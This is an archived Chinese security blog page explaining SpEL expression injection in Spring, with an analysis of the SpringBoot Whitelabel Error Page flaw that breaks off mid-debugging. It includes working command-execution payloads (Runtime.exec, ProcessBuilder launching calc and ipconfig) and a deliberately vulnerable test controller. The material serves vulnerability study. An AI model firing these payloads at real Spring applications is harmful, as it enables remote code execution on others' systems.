@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="title: SpEL表达式注入date: 2019-05-28 08:15:41tags: Java安全  SpEl简介 Spring Expression Language是一种强大的表达式语言,Spring开发中经常会用到。正是因为功能强大,导致在某些情况下,用户可从外部注入SpEl表达式,导致命令执行。          用法 SpEl表达式有3种用法,@Value、xml配置、代码块中">
+<meta name="keywords" content="P0rZ9">
+<meta property="og:type" content="article">
+<meta property="og:title" content="P0rZ9&#39;s blog">
+<meta property="og:url" content="http://yoursite.com/2019/05/30/SpEL表达式注入/index.html">
+<meta property="og:site_name" content="P0rZ9&#39;s blog">
+<meta property="og:description" content="title: SpEL表达式注入date: 2019-05-28 08:15:41tags: Java安全  SpEl简介 Spring Expression Language是一种强大的表达式语言,Spring开发中经常会用到。正是因为功能强大,导致在某些情况下,用户可从外部注入SpEl表达式,导致命令执行。          用法 SpEl表达式有3种用法,@Value、xml配置、代码块中">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.15.40.38-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.15.10.47-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.00.38-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.31.53-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.20.32.11-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.41.04-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.46.40-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.49.25-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.20.39.57-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.56.29-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.20.40.55-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-28.21.43.38-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-28.21.45.05-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-28.21.47.12-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.22.01.46-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.21.49.20-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.21.54.03-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.21.55.47-image.png">
+<meta property="og:updated_time" content="2019-05-30T13:45:28.801Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="P0rZ9&#39;s blog">
+<meta name="twitter:description" content="title: SpEL表达式注入date: 2019-05-28 08:15:41tags: Java安全  SpEl简介 Spring Expression Language是一种强大的表达式语言,Spring开发中经常会用到。正是因为功能强大,导致在某些情况下,用户可从外部注入SpEl表达式,导致命令执行。          用法 SpEl表达式有3种用法,@Value、xml配置、代码块中">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.15.40.38-image.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="../../../../images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="../../../../images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>P0rZ9&#39;s blog</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="../../../../css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="../../22/Weblogic-CVE-2019-2725分析通杀poc/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/05/30/SpEL表达式注入/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&text="><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&title="><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&is_video=false&description="><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://yoursite.com/2019/05/30/SpEL表达式注入/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&title="><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&title="><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&title="><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&title="><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&name=&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SpEl简介"><span class="toc-number">1.</span> <span class="toc-text">SpEl简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#用法"><span class="toc-number">1.1.</span> <span class="toc-text">用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#语法实例"><span class="toc-number">1.2.</span> <span class="toc-text">语法实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#类相关表达式"><span class="toc-number">1.2.1.</span> <span class="toc-text">类相关表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#类类型表达式"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">类类型表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#类实例化"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">类实例化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#对象方法调用"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">对象方法调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#变量定义及引用"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">变量定义及引用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#主要接口"><span class="toc-number">1.2.2.</span> <span class="toc-text">主要接口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SpEL导致的任意命令执行原理分析"><span class="toc-number">2.</span> <span class="toc-text">SpEL导致的任意命令执行原理分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞案例分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞案例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SpringBoot-SpEL表达式注入漏洞"><span class="toc-number">3.1.</span> <span class="toc-text">SpringBoot SpEL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件"><span class="toc-number">3.1.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">3.1.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.1.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Whitelabel-Error-Page是如何实现的"><span class="toc-number">3.1.4.</span> <span class="toc-text">Whitelabel Error Page是如何实现的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复"><span class="toc-number">3.1.5.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#测试补丁"><span class="toc-number">3.1.6.</span> <span class="toc-text">测试补丁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-Data-Commons远程代码执行漏洞（CVE-2018-1273）"><span class="toc-number">3.2.</span> <span class="toc-text">Spring Data Commons远程代码执行漏洞（CVE-2018-1273）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复"><span class="toc-number">3.2.3.</span> <span class="toc-text">修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#防御"><span class="toc-number">4.</span> <span class="toc-text">防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.1.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-number">4.1.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">P0rZ9's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-05-30T13:43:14.421Z" itemprop="datePublished">2019-05-30</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <hr>
+<p>title: SpEL表达式注入<br>date: 2019-05-28 08:15:41<br>tags: Java安全</p>
+<hr>
+<h1 id="SpEl简介"><a href="#SpEl简介" class="headerlink" title="SpEl简介"></a>SpEl简介</h1><blockquote>
+<p>Spring Expression Language是一种强大的表达式语言,Spring开发中经常会用到。正是因为功能强大,导致在某些情况下,用户可从外部注入SpEl表达式,导致命令执行。        </p>
+</blockquote>
+<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><blockquote>
+<p>SpEl表达式有3种用法,@Value、xml配置、代码块中使用Expression。在漏洞审计过程中,主要关注Expression这种情况,另外两种情况一般都是写死的,攻击者不可控。            </p>
+</blockquote>
+<p><strong>@Value</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@value(&quot;#&#123;表达式&#125;&quot;)</span><br><span class="line">public String arg;</span><br></pre></td></tr></table></figure></p>
+<p><strong>xml配置</strong>(jackson的CVE-2017-17485构造恶意xml文件就是这种方式)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;Bean1&quot; class=&quot;com.test.xxx&quot;&gt;</span><br><span class="line">	&lt;property name=&quot;arg&quot; value=&quot;#&#123;表达式&#125;&quot;&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure></p>
+<p><strong>代码块中使用Expression</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> public static void main(String[] args)&#123;</span><br><span class="line">        //创建ExpressionParser解析表达式</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        //放置表达式</span><br><span class="line">        Expression expression = parser.parseExpression(&quot;$&#123;123&#125;&quot;);</span><br><span class="line">        //执行表达式,默认容器是spring本身容器:ApplicationContext</span><br><span class="line">        Object obj = expression.getValue();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //使用其他容器方法</span><br><span class="line">        //创建虚拟容器StandardEvaluationContext</span><br><span class="line">        StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">        //向容器内添加Bean</span><br><span class="line">        User user = new User();</span><br><span class="line">        context.setVariable(&quot;bean_id&quot;,user);</span><br><span class="line">        //执行表达式</span><br><span class="line">        Object obj2 = expression.getValue(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>SpEL工作流程:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.定义解析器ExpressionParser,Spring中默认为SpelExpressionParser			</span><br><span class="line">2.调用解析器的parseExpression()方法将传入字符串转为Expression对象				</span><br><span class="line">3.(这一步可选)定义上下文,SpEL使用接口EvaluationContext,如果不创建,默认为Spring容器ApplicationContext				</span><br><span class="line">4.执行setValue()或getValue()求值</span><br></pre></td></tr></table></figure></p>
+<h2 id="语法实例"><a href="#语法实例" class="headerlink" title="语法实例"></a>语法实例</h2><blockquote>
+<p>除了基本类型表达式,我们需要掌握的是类相关的表达式</p>
+</blockquote>
+<h3 id="类相关表达式"><a href="#类相关表达式" class="headerlink" title="类相关表达式"></a>类相关表达式</h3><h4 id="类类型表达式"><a href="#类类型表达式" class="headerlink" title="类类型表达式"></a>类类型表达式</h4><blockquote>
+<p>使用T(Type)表示Type类的实例,Type为全限定名称,如T(com.test.Bean1)。但是java.lang例外,该包下的类可以不指定包名。得到类实例后会访问类静态方法与字段            </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">Expression exp  = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;mspaint\&quot;)&quot;);</span><br><span class="line">Object obj = exp.getValue();</span><br></pre></td></tr></table></figure>
+<p>弹出画图</p>
+<h4 id="类实例化"><a href="#类实例化" class="headerlink" title="类实例化"></a>类实例化</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">Expression exp  = parser.parseExpression(&quot;new java.util.Date()&quot;);</span><br><span class="line">Object obj = exp.getValue();</span><br><span class="line">System.out.println(obj);</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">Mon May 27 11:40:08 CST 2019</span><br></pre></td></tr></table></figure>
+<h4 id="对象方法调用"><a href="#对象方法调用" class="headerlink" title="对象方法调用"></a>对象方法调用</h4><blockquote>
+<p>与Java语法一样,直接调用即可            </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//ab</span><br><span class="line">String exp  = parser.parseExpression(&quot;&apos;abcde&apos;.substring(0,2)&quot;).getValue(String.class);</span><br></pre></td></tr></table></figure>
+<h4 id="变量定义及引用"><a href="#变量定义及引用" class="headerlink" title="变量定义及引用"></a>变量定义及引用</h4><blockquote>
+<p>变量通过EvaluationContext接口的setVariable(name,value)定义,在表达式中使用#name引用;另外还可以用#root与#this引用根对象与上下文对象.        </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">EvaluationContext context = new StandardEvaluationContext(new User());</span><br><span class="line">context.setVariable(&quot;beanId1&quot;, &quot;test1&quot;);  //自定义变量</span><br><span class="line"></span><br><span class="line">//获取自定义变量 beanId1     test1</span><br><span class="line">String result1 = parser.parseExpression(&quot;#beanId1&quot;).getValue(context, String.class);</span><br><span class="line"></span><br><span class="line">//获取根对象 即User      User@40f0c</span><br><span class="line">User result2 = parser.parseExpression(&quot;#root&quot;).getValue(context, User.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line"></span><br><span class="line">//获取当前上下文对象 USer   User@40f0c</span><br><span class="line">User result3 = parser.parseExpression(&quot;#this&quot;).getValue(context, User.class);</span><br><span class="line">System.out.println(result3);</span><br></pre></td></tr></table></figure>
+<h3 id="主要接口"><a href="#主要接口" class="headerlink" title="主要接口"></a>主要接口</h3><p><strong>ExpressionParser</strong></p>
+<blockquote>
+<p>解析器，该接口的默认实现是SpelExpressionParser，使用其parseExpression()方法将字符串表达式转化为Expression对象</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.15.40.38-image.png" alt="2019-05-27.15.40.38-image.png"></p>
+<p>实例:            </p>
+<blockquote>
+<p>ParserContext接口用于定义传入的字符串表达式是不是模板,我们这里自定义一个ParserContext对象，并实现主要方法</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">ParserContext parserContext = new ParserContext() &#123;</span><br><span class="line">    public boolean isTemplate() &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getExpressionPrefix() &#123;</span><br><span class="line">        return &quot;#&#123;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getExpressionSuffix() &#123;</span><br><span class="line">        return &quot;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">Expression exp  = parser.parseExpression(&quot;#&#123;&apos;hello &apos;&#125;&quot;,parserContext);</span><br><span class="line">String msg = (String) exp.getValue();</span><br><span class="line">System.out.println(msg);</span><br></pre></td></tr></table></figure>
+<p>我们使用<code>parseExpression()</code>解析表达式时指定该对象,表示传入表达式须为模板(<code>${}</code>)格式。                </p>
+<p><strong>Expression接口</strong></p>
+<blockquote>
+<p>表达式对象,默认实现为org.springframework.expression.spel.standard的SpelExpression,其中getValue()方法用于获取表达式值,setValue()方法用于设置对象值(都会执行表达式,所以SpEl注入要重点关注这两个方法)        </p>
+</blockquote>
+<p><strong>EvaluationContext接口</strong>            </p>
+<blockquote>
+<p>表示上下文环境,用于解析属性，方法与特殊字段的一个接口。默认实现为org.springframework.expression.spel.support中的StandardEvaluationContext,使用setRootObject设置根对象,setVariable()注册自定义变脸,registerFunction()注册自定义函数等等    </p>
+</blockquote>
+<p><strong>SpEl提供的2个EvaluationContext的区别</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">StandardEvaluationContext  功能强大,可以设置SpEl的所有配置,包括Java类型,Bean的引用等,是不安全的。		</span><br><span class="line"></span><br><span class="line">SimpleEvaluationContext 仅支持SpEL语言语法的子集(Map),不包括Java类型引用,Bean引用等</span><br><span class="line">可用于防止SpEl表达式注入,本文实例中的Spring Data Commons的RCE 官方修复方案就是将StandardEvaluationContext替换为SimpleEvaluationContext</span><br></pre></td></tr></table></figure></p>
+<h1 id="SpEL导致的任意命令执行原理分析"><a href="#SpEL导致的任意命令执行原理分析" class="headerlink" title="SpEL导致的任意命令执行原理分析"></a>SpEL导致的任意命令执行原理分析</h1><blockquote>
+<p>成因:<br>1.不设置容器(默认ApplciationContext)或设为StandardEvaluationContext<br>2.用户可控控制表达式内容且无过滤<br>3.最后使用getValue()或setValue()执行了表达式</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.15.10.47-image.png" alt="2019-05-27.15.10.47-image.png"></p>
+<h1 id="漏洞案例分析"><a href="#漏洞案例分析" class="headerlink" title="漏洞案例分析"></a>漏洞案例分析</h1><p>成因同上</p>
+<h2 id="SpringBoot-SpEL表达式注入漏洞"><a href="#SpringBoot-SpEL表达式注入漏洞" class="headerlink" title="SpringBoot SpEL表达式注入漏洞"></a>SpringBoot SpEL表达式注入漏洞</h2><blockquote>
+<p>使用SpEl渲染错误页面,当攻击者传入恶意SpEL表达式,程序解析时会触发执行表达式    </p>
+</blockquote>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1.SpringBoot版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.1.0-1.1.12</span><br><span class="line">1.2.0-1.2.7</span><br><span class="line">1.3.0</span><br></pre></td></tr></table></figure></p>
+<p>2.在Controller中,异常信息中存在可控数据        </p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>新建一个Maven项目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pom.xml</span><br><span class="line">&lt;parent&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.2.5.RELEASE&lt;/version&gt;</span><br><span class="line">  &lt;relativePath/&gt;</span><br><span class="line">&lt;/parent&gt;</span><br><span class="line"></span><br><span class="line">TestController.java			</span><br><span class="line">@Controller</span><br><span class="line">public class TestController &#123;</span><br><span class="line">    @RequestMapping(&quot;/&quot;)</span><br><span class="line">    public String test(String payload)&#123;</span><br><span class="line">        System.out.println(&quot;test&quot;);</span><br><span class="line">        throw new IllegalArgumentException(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DemoApplication.java</span><br><span class="line">@SpringBootApplication</span><br><span class="line">@ComponentScan(basePackages = &#123;&quot;sample.controller&quot;&#125;)</span><br><span class="line">public class DemoApplication &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(DemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>直接运行DemoApplication.main()即可启动SpringBoot程序</p>
+<p>请求:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/?payload=$&#123;new java.lang.ProcessBuilder(new java.lang.String(new byte[]&#123;99,97,108,99&#125;)).start()&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://localhost:8080/?payload=$&#123;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;ipconfig&apos;).getInputStream())&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.00.38-image.png" alt="2019-05-27.17.00.38-image.png"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>漏洞成因</strong>                                </p>
+<blockquote>
+<p><code>ErrorMvcAutoConfiguration</code>下面的<code>SpelView</code>类的<code>render()</code>,该方法作用是解析<code>Whitelabel Error Page</code>模板内容并填充数据,在填充数据过程中递归解析的<code>${message}</code>(用户可控),导致SpEl表达式注入。                    </p>
+</blockquote>
+<p>开始调试,首先进入<code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration#render()</code><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.31.53-image.png" alt="2019-05-27.17.31.53-image.png"></p>
+<p>函数设置<code>this.context</code>的<code>RootObject</code>值,接着调用<code>replacePlaceholders()</code>,其中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.template=&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;&lt;div id=&apos;created&apos;&gt;$&#123;timestamp&#125;&lt;/div&gt;&lt;div&gt;There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).&lt;/div&gt;&lt;div&gt;$&#123;message&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><br></pre></td></tr></table></figure></p>
+<p>跟进<code>replacePlaceholders()</code>:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.20.32.11-image.png" alt="2019-05-27.20.32.11-image.png"></p>
+<p>该方法作用是将表达式结果替换，跟进<code>parseStringValue()</code>,这个就是我们解析的关键函数<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.41.04-image.png" alt="2019-05-27.17.41.04-image.png"></p>
+<p>循环取得以<code>${</code>开头,以<code>}</code>为结尾的表达式,挨个赋值。当解析到<code>message</code>时，跟进<code>resolvePlaceholder()</code>:</p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.46.40-image.png" alt="2019-05-27.17.46.40-image.png"></p>
